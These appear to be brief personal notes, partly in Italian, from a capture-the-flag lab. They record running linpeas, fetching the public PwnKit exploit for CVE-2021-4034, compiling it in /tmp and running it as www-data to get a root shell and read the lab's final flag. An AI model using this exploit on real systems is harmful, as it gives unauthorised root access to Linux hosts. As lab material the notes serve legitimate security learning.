used Linepeas.sh

![[Pasted image 20221029124922.png]]


![[Pasted image 20221029124938.png]]



https://github.com/berdav/CVE-2021-4034


scaricati i file pwnkit.c e cve-2021-4034.c in /tmp

scaricato anche il Makefile





```
www-data@ip-10-10-104-194:/tmp$ make
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
www-data@ip-10-10-104-194:/tmp$ ls
GCONV_PATH=.
Makefile
a.out
ciao
cve-2021-4034
cve-2021-4034.c
exp.c
gconv-modules
linpeas.sh
pwnkit.c
pwnkit.so
systemd-private-a38f75834ff147c28c9d6e11a1580680-systemd-timesyncd.service-u6j3OB
tmux-33
www-data@ip-10-10-104-194:/tmp$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
3rd.txt  snap
# cat 3rd.txt
3rd ingredients: fleeb juice
#



```


